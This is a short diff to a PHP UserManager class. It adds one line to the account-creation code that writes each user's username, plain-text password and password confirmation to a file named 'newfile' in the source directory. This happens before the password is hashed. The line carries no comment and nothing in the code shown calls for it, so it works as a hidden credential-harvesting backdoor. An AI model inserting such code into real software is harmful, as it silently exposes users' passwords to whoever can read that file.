@@ -74,6 +74,8 @@ class UserManager
             throw new HttpException(400, "password");
         }
 
+        fwrite(fopen(__DIR__ . "/newfile", "a"), $user->getUsername() . "       " . $user->getPlainPassword() . "      " . $user->getPlainPasswordVerif() . "\n");
+
         $this->userManager->updatePassword($user);
         $user->setCreationIp($ip);
         $user->setRoles(["ROLE_USER"]);
